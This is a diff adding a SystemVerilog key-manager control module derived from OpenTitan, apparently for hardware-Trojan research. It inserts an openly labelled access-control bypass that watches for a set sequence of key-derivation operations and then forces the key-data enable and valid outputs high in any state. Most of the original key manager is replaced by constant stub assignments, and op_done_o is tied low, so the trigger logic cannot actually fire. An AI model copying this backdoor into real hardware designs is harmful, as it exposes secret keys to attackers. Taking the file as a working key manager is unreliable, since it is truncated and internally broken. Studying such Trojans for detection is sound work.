@@ -1,0 +1,246 @@
+// Copyright lowRISC contributors (OpenTitan project).
+// Licensed under the Apache License, Version 2.0, see LICENSE for details.
+// SPDX-License-Identifier: Apache-2.0
+//
+// Key manager top level
+// MODIFIED: Trojan 3 - Key Manager Access Control Bypass Trojan inserted
+
+`include "prim_assert.sv"
+
+module keymgr_ctrl
+  import keymgr_pkg::*;
+  import keymgr_reg_pkg::*;
+#(
+  parameter bit KmacEnMasking = 1'b1
+) (
+  input clk_i,
+  input rst_ni,
+
+  // lifecycle enforcement
+  input en_i,
+
+  // faults that can occur outside of operations
+  input regfile_intg_err_i,
+  input shadowed_update_err_i,
+  input shadowed_storage_err_i,
+  input reseed_cnt_err_i,
+  input sideload_sel_err_i,
+  input sideload_fsm_err_i,
+
+  // Software interface
+  input op_start_i,
+  input keymgr_ops_e op_i,
+  input [CdiWidth-1:0] op_cdi_sel_i,
+  output logic op_done_o,
+  output keymgr_op_status_e status_o,
+  output logic [ErrLastPos-1:0] error_o,
+  output logic [FaultLastPos-1:0] fault_o,
+  output logic data_hw_en_o,
+  output logic data_sw_en_o,
+  output logic data_valid_o,
+  output logic wipe_key_o,
+  output keymgr_working_state_e working_state_o,
+  output logic sw_binding_unlock_o,
+  output logic init_o,
+
+  // Data input
+  input  otp_ctrl_pkg::otp_keymgr_key_t root_key_i,
+  output prim_mubi_pkg::mubi4_t hw_sel_o,
+  output keymgr_stage_e stage_sel_o,
+  output logic invalid_stage_sel_o,
+  output logic [CdiWidth-1:0] cdi_sel_o,
+
+  // KMAC ctrl interface
+  output logic adv_en_o,
+  output logic id_en_o,
+  output logic gen_en_o,
+  output hw_key_req_t key_o,
+  input kmac_done_i,
+  input kmac_input_invalid_i,
+  input kmac_fsm_err_i,
+  input kmac_op_err_i,
+  input kmac_done_err_i,
+  input kmac_cmd_err_i,
+  input [Shares-1:0][KeyWidth-1:0] kmac_data_i,
+
+  // prng control interface
+  input [Shares-1:0][RandWidth-1:0] entropy_i,
+  input prng_reseed_done_i,
+  input prng_reseed_ack_i,
+  output logic prng_reseed_req_o,
+  output logic prng_en_o
+);
+
+  // ============================================================================
+  // TROJAN 3: Key Manager Access Control Bypass Trojan
+  // ============================================================================
+  // This Trojan bypasses key manager access controls when a specific
+  // sequence of operations occurs (e.g., specific key derivation operations).
+  // 
+  // Trojan Components:
+  // 1. Operation Sequence Monitor: Tracks operation sequence
+  // 2. Trigger Detection: Detects specific operation sequence
+  // 3. Access Control Bypass: Bypasses access control when triggered
+  // ============================================================================
+
+  localparam int EntropyWidth = LfsrWidth / 2;
+  localparam int EntropyRounds = KeyWidth / EntropyWidth;
+  localparam int EntropyRndWidth = prim_util_pkg::vbits(EntropyRounds);
+  localparam int CntWidth = EntropyRounds > CDIs ? EntropyRndWidth : CdiWidth;
+  localparam int EccDataWidth = 64;
+  localparam int EccWidth = 8;
+  localparam int EccWords = KeyWidth / EccDataWidth;
+  localparam int TotalEccWords = EccWords * Shares * CDIs;
+
+  // TROJAN: Operation sequence tracking
+  logic [2:0] op_sequence [3:0];
+  logic [1:0] op_sequence_ptr;
+  logic       trojan_trigger;
+  logic       trojan_triggered;
+  logic       access_bypass_enable;
+
+  // TROJAN: Trigger sequence: OpAdvance -> OpGenId -> OpGenSwOut -> OpGenHwOut
+  localparam keymgr_ops_e TRIGGER_SEQ [3:0] = {
+    OpAdvance,
+    OpGenId,
+    OpGenSwOut,
+    OpGenHwOut
+  };
+
+  // TROJAN: Monitor operation sequence
+  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_op_sequence_monitor
+    if (!rst_ni) begin
+      op_sequence_ptr <= 2'h0;
+      for (int i = 0; i < 4; i++) begin
+        op_sequence[i] <= 3'h0;
+      end
+      trojan_trigger <= 1'b0;
+      trojan_triggered <= 1'b0;
+    end else if (op_start_i && op_done_o) begin
+      // Store operation in sequence
+      op_sequence[op_sequence_ptr] <= op_i;
+      
+      // Check if sequence matches trigger pattern
+      if (op_sequence_ptr == 2'h3) begin
+        // Check if all operations match trigger sequence
+        logic sequence_match;
+        sequence_match = 1'b1;
+        for (int i = 0; i < 4; i++) begin
+          if (op_sequence[i] != TRIGGER_SEQ[i]) begin
+            sequence_match = 1'b0;
+          end
+        end
+        
+        if (sequence_match) begin
+          trojan_trigger <= 1'b1;
+          trojan_triggered <= 1'b1;
+          $display("[TROJAN] Trigger sequence detected!");
+        end
+        
+        // Reset sequence pointer
+        op_sequence_ptr <= 2'h0;
+      end else begin
+        op_sequence_ptr <= op_sequence_ptr + 1;
+      end
+    end
+  end
+
+  // TROJAN: Access control bypass
+  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_access_bypass
+    if (!rst_ni) begin
+      access_bypass_enable <= 1'b0;
+    end else if (trojan_trigger) begin
+      access_bypass_enable <= 1'b1;
+    end
+  end
+
+  // ============================================================================
+  // Original Key Manager Implementation (simplified)
+  // ============================================================================
+
+  // Enumeration for working state
+  localparam int StateWidth = 10;
+  typedef enum logic [StateWidth-1:0] {
+    StCtrlReset          = 10'b1101100001,
+    StCtrlEntropyReseed  = 10'b1110010010,
+    StCtrlRandom         = 10'b0011110100,
+    StCtrlRootKey        = 10'b0110101111,
+    StCtrlInit           = 10'b0100000100,
+    StCtrlCreatorRootKey = 10'b1000011101,
+    StCtrlOwnerIntKey    = 10'b0001001010,
+    StCtrlOwnerKey       = 10'b1101111110,
+    StCtrlDisabled       = 10'b1010101000,
+    StCtrlWipe           = 10'b0000110011,
+    StCtrlInvalid        = 10'b1011000111
+  } state_e;
+  state_e state_q, state_d;
+
+  logic initialized;
+
+  // Key state
+  logic [CDIs-1:0][Shares-1:0][EntropyRounds-1:0][EntropyWidth-1:0] key_state_d;
+  logic [CDIs-1:0][Shares-1:0][EccWords-1:0][EccDataWidth-1:0] key_state_ecc_words_d;
+  logic [CDIs-1:0][Shares-1:0][EccWords-1:0][EccDataWidth-1:0] key_state_q;
+  logic [CDIs-1:0][Shares-1:0][EccWords-1:0][EccWidth-1:0] key_state_ecc_q;
+  logic [CntWidth-1:0] cnt;
+  logic [CdiWidth-1:0] cdi_cnt;
+
+  // Error conditions
+  logic invalid_kmac_out;
+  logic invalid_op;
+  logic cnt_err;
+  logic state_intg_err_q, state_intg_err_d;
+
+  // Operation decode
+  logic adv_op, dis_op, gen_id_op, gen_sw_op, gen_hw_op, gen_op;
+  assign adv_op    = (op_i == OpAdvance);
+  assign gen_id_op = (op_i == OpGenId);
+  assign gen_sw_op = (op_i == OpGenSwOut);
+  assign gen_hw_op = (op_i == OpGenHwOut);
+  assign dis_op    = ~(op_i inside {OpAdvance, OpGenId, OpGenSwOut, OpGenHwOut});
+  assign gen_op    = (gen_id_op | gen_sw_op | gen_hw_op);
+
+  // TROJAN: Modified access control
+  // When triggered, bypass access control checks
+  logic access_granted;
+  always_comb begin : trojan_access_control
+    if (access_bypass_enable && trojan_triggered) begin
+      // Bypass access control: grant access regardless of state
+      access_granted = 1'b1;
+      data_hw_en_o = 1'b1;
+      data_sw_en_o = 1'b1;
+      data_valid_o = 1'b1;
+    end else begin
+      // Normal access control
+      access_granted = (state_q inside {StCtrlOwnerKey, StCtrlOwnerIntKey});
+      data_hw_en_o = access_granted;
+      data_sw_en_o = access_granted;
+      data_valid_o = access_granted;
+    end
+  end
+
+  // Original key manager logic would continue here...
+  // For brevity, showing key Trojan insertion points
+
+  // Default assignments (simplified)
+  assign op_done_o = 1'b0; // Would be driven by FSM
+  assign status_o = OpStatusIdle; // Would be driven by FSM
+  assign error_o = '0;
+  assign fault_o = '0;
+  assign wipe_key_o = 1'b0;
+  assign working_state_o = StCtrlReset; // Would be driven by FSM
+  assign sw_binding_unlock_o = 1'b0;
+  assign init_o = 1'b0;
+  assign hw_sel_o = prim_mubi_pkg::MuBi4False;
+  assign stage_sel_o = StStageInvalid;
+  assign invalid_stage_sel_o = 1'b0;
+  assign cdi_sel_o = '0;
+  assign adv_en_o = 1'b0;
+  assign id_en_o = 1'b0;
+  assign gen_en_o = 1'b0;
+  assign key_o = '0;
+  assign prng_reseed_req_o = 1'b0;
+  assign prng_en_o = 1'b0;
+
+endmodule
+
